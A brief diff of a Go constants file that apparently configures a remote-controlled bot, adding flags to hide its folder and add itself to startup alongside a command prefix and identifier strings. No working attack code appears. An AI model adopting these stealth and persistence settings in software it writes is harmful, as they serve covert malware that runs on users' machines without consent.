@@ -6,6 +6,11 @@ const (
 	Identifier     string = "ERFJK"
 	Verifier       string = "FGUJ2"
 
+	// debug
+	Debugging    bool = false
+	HideFolder   bool = true
+	AddToStartup bool = true
+
 	// bot stuff
 	Prefix string = ">"
 
